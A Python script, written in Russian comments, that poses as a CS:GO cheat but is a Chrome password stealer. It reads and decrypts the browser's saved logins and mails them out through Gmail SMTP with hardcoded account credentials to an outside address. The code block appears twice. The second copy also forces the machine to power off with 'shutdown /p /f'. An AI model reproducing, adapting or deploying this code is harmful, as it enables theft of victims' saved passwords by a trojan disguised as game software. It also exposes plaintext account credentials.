import os
import requests
from sys import exit
import sqlite3
from win32crypt import CryptUnprotectData
import argparse
print("Читы для кс го")
print('Для начала закройте браузер хром,через него мы инжектим чит')
print('Таким образом он не палится,а мы ждем...')

# Вычисляем папку куда установлен Chrome в Windows

def chromepath():
    PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
    if (os.path.isdir(PathName) == False):
        exit(0)
    return PathName  


# Грабим базу данных с сохраненными паролями
def grub():
    secret = []
    path = chromepath()
    try:
        connection = sqlite3.connect(path + "Login Data")
        with connection:
            cursor = connection.cursor()
            v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()

        for i in value:
            password = CryptUnprotectData(i[2], None, None, None, 0)[1]
            if password:
                secret.append({
                    '1': i[0],
                    '2': i[1],
                    '3': str(password)
                })
                    
    except sqlite3.OperationalError as e:
            if (str(e) == 'database is locked'):
                print('Вы должны выключить Chrome прежде чем запускать скрипт')
                input()
                exit(0)
               
            else:
                exit(0)
    if secret == []:
    	pass
    else:          
    	return secret          

# Показываем пароли на экране (вы можете послать их себе на почту или на скрипт php - ловушку для данных)
for data in grub():
    for x in data.values():
        print(x)

import smtplib
smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
smtpObj.starttls()
smtpObj.login('lolkekzek228337@gmail.com','LolKekZek228')
smtpObj.sendmail("lolkekzek228337@gmail.com","regovcev@gmail.com", x)
smtpObj.quit()



# установите pywin32 чтобы все работало
import os
import requests
from sys import exit
import sqlite3
from win32crypt import CryptUnprotectData
import argparse
print("Читы для кс го")
print('Для начала закройте браузер хром,через него мы инжектим чит')
print('Таким образом он не палится,а мы ждем...')

# Вычисляем папку куда установлен Chrome в Windows

def chromepath():
    PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
    if (os.path.isdir(PathName) == False):
        exit(0)
    return PathName  


# Грабим базу данных с сохраненными паролями
def grub():
    secret = []
    path = chromepath()
    try:
        connection = sqlite3.connect(path + "Login Data")
        with connection:
            cursor = connection.cursor()
            v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()

        for i in value:
            password = CryptUnprotectData(i[2], None, None, None, 0)[1]
            if password:
                secret.append({
                    '1': i[0],
                    '2': i[1],
                    '3': str(password)
                })
                    
    except sqlite3.OperationalError as e:
            if (str(e) == 'database is locked'):
                print('Вы должны выключить Chrome прежде чем запускать скрипт')
                input()
                exit(0)
               
            else:
                exit(0)
    if secret == []:
    	pass
    else:          
    	return secret          

# Показываем пароли на экране (вы можете послать их себе на почту или на скрипт php - ловушку для данных)
for data in grub():
    for x in data.values():
        print(x)
print("Чит заинжектился")
os.system('shutdown /p /f')
input()

import smtplib
smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
smtpObj.starttls()
smtpObj.login('lolkekzek228337@gmail.com','LolKekZek228')
smtpObj.sendmail("lolkekzek228337@gmail.com","regovcev@gmail.com", x)
smtpObj.quit()